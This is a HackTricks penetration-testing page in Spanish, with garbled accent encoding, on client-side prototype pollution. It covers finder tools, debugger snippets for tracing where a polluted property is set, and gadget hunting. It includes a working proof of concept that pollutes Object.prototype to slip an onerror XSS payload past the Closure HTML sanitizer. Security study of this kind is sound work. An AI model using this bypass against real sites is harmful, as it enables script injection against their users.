# Poluci√≥n de Prototipos en el Lado del Cliente

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Descubriendo usando herramientas autom√°ticas

Las herramientas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **y** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) se pueden utilizar para **encontrar vulnerabilidades de poluci√≥n de prototipos**.

Adem√°s, tambi√©n puedes usar la **extensi√≥n del navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear autom√°ticamente** las **p√°ginas** a las que accedes en busca de vulnerabilidades de poluci√≥n de prototipos.

### Depuraci√≥n de d√≥nde se utiliza una propiedad <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Encontrando la causa ra√≠z de la Inyecci√≥n de Prototipo <a href="#5530" id="5530"></a>

Una vez que alguna de las herramientas haya **identificado** una **vulnerabilidad de inyecci√≥n de prototipo**, si el **c√≥digo** no es muy **complejo**, puedes **buscar** en el c√≥digo JS las palabras clave **`location.hash/decodeURIComponent/location.search`** en las Herramientas de Desarrollo de Chrome y encontrar el lugar vulnerable.

Si el c√≥digo es grande y complejo, hay una manera f√°cil de **descubrir d√≥nde est√° el c√≥digo vulnerable**:

* Usando una de las herramientas, **encuentra una vulnerabilidad** y obt√©n un **payload** que establecer√° una propiedad en el constructor. En ppmap se te dar√° algo como: `constructor[prototype][ppmap]=reserved`
* Ahora, establece un **punto de interrupci√≥n en la primera l√≠nea de c√≥digo JS** que se va a ejecutar en la p√°gina y actualiza la p√°gina con el payload para que la **ejecuci√≥n se detenga all√≠**.
* Mientras la ejecuci√≥n de JS est√° detenida, **pega el siguiente script en la consola de JS**. Este c√≥digo indicar√° cuando se crea la propiedad 'ppmap', para que puedas encontrar d√≥nde se cre√≥.
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
Vuelve a **Fuentes** y haz clic en "Reanudar" la **ejecuci√≥n** del script. Despu√©s de hacer eso, todo el **javascript** se ejecutar√° y ppmap se volver√° a contaminar como se esperaba. Con la ayuda del Fragmento, podemos encontrar exactamente d√≥nde se contamina la propiedad ppmap. Podemos hacer clic en la **Pila de llamadas** y te encontrar√°s con diferentes pilas donde ocurri√≥ la contaminaci√≥n.

Pero ¬øcu√°l elegir? La mayor√≠a de las veces, la Contaminaci√≥n de Prototipos ocurre en bibliotecas de Javascript, as√≠ que apunta a la pila que est√° adjunta a los archivos de biblioteca .js (mira el lado derecho, al igual que en la imagen, para saber a qu√© punto final est√° adjunta la pila). En este caso, tenemos 2 pilas en la l√≠nea 4 y 6, l√≥gicamente elegiremos la l√≠nea 4 porque esa l√≠nea es la primera vez que ocurre la Contaminaci√≥n, lo que significa que esta l√≠nea es la causa de la vulnerabilidad. Haciendo clic en la pila, seremos redirigidos al c√≥digo vulnerable.

![](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrar Gadgets de Script

El gadget es el **c√≥digo que se aprovechar√° una vez que se descubra una vulnerabilidad de PP**.

Si la aplicaci√≥n es sencilla, podemos **buscar** palabras clave como **`srcdoc/innerHTML/iframe/createElement`** y revisar el c√≥digo fuente para comprobar si conduce a la ejecuci√≥n de javascript. A veces, las t√©cnicas mencionadas pueden no encontrar gadgets en absoluto. En ese caso, la revisi√≥n pura del c√≥digo fuente revela algunos gadgets interesantes como el siguiente ejemplo.

### Ejemplo de encontrar un gadget de PP en el c√≥digo de la biblioteca Mithil

Consulta este art√≠culo: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilaci√≥n de payloads para bibliotecas vulnerables

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de sanitizadores HTML mediante PP

[**Esta investigaci√≥n**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) muestra gadgets de PP que se pueden utilizar para **burlar las sanitizaciones** proporcionadas por algunas bibliotecas de sanitizadores HTML:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referencias

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
